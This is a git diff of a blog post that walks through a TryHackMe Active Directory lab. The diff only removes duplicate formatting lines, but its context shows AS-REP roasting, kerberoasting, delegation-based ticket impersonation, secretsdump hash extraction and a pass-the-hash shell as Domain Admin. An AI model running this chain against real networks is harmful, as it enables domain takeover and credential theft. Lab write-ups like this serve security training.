@@ -98,7 +98,6 @@ Lets go for RDP access I tried RDP with Userless access through <mark style="bac
 rdesktop -r 10.10.182.217
 ```
 {: .nolineno}
-{: .nolineno}
 
 I get this user session login sessions and the background image indicates some credentials so I copied it and tried to login with that but I got the following response.
 
@@ -198,7 +197,6 @@ Password:
 1144: COOCTUS\MSSQL Access (SidTypeGroup)
 ```
 {: .nolineno}
-{: .nolineno}
 
 I sorted this list and save them in a file <mark style="background: #ABF7F7A6;">users.txt</mark> and looked for some TGT tickets with <mark style="background: #ABF7F7A6;">as-rep-roasting</mark> method through <mark style="background: #FF5582A6;">GetNPUsers.py</mark> Tool from impackets but noluck . 
 
@@ -233,7 +231,6 @@ Impacket v0.11.0 - Copyright 2023 Fortra
 [-] User password-reset does not have UF_DONT_REQUIRE_PREAUTH set
 ```
 {: .nolineno}
-{: .nolineno}
 
 
 Now lets look into <mark style="background: #ABF7F7A6;">kerberostable SPN tickets</mark> with Visitor user credentials with <mark style="background: #FF5582A6;">netexec</mark> Tool this time like this ⏬
@@ -241,7 +238,6 @@ Now lets look into <mark style="background: #ABF7F7A6;">kerberostable SPN ticket
 ```bash
 netexec ldap 10.10.182.217 -u Visitor -p '<PASSWORD>' --kerberoasting spn.txt
 ```
-{: .nolineno}
 {: .nolineno}
 
 ![Image](Pasted%20image%2020240404134635.png)
@@ -276,7 +272,6 @@ INFO: Querying computer: DC.COOCTUS.CORP
 INFO: Done in 00M 49S
 ```
 {: .nolineno}
-{: .nolineno}
 
 
 ![Image](Pasted%20image%2020240404143758.png)
@@ -300,7 +295,6 @@ Impacket v0.11.0 - Copyright 2023 Fortra
 [*] Saving ticket in Administrator@oakley_DC@COOCTUS.CORP.ccache
 ```
 {: .nolineno}
-{: .nolineno}
 
 Now I got the impersonation ticket for administrator , lets export it to its kerbrose variable <span style="color:#f04276">KRB5CCNAME</span> .
 
@@ -308,7 +302,6 @@ Now I got the impersonation ticket for administrator , lets export it to its ker
 ┌──(kali㉿kali)-[~/Downloads/Tryhackme/crocc_crew]
 └─$ export KRB5CCNAME=Administrator@oakley_DC@COOCTUS.CORP.ccache 
 ```
-{: .nolineno}
 {: .nolineno}
 
 Now it is exported lets extract the secrets through <mark style="background: #FF5582A6;">secretsdump</mark> Tool from impacket like this ⏬
@@ -350,7 +343,6 @@ COOCTUS.CORP\mark:1115:aad3b435b51404eeaad3b435b51404ee:0b5e04d90d..............
 COOCTUS.CORP\Jeff:1116:aad3b435b51404eeaad3b435b51404ee:1004ed2b099.............3cc9b7:::
 ...
 ```
-{: .nolineno}
 {: .nolineno}
 
 Lets **Pass-the-Hash** and get the shell of Administrator like this 🔻
@@ -396,7 +388,6 @@ C:.
 \---Videos
 *Evil-WinRM* PS C:\Users\Administrator>
 ```
-{: .nolineno}
 {: .nolineno}
 
 I am Domain Admin Now !
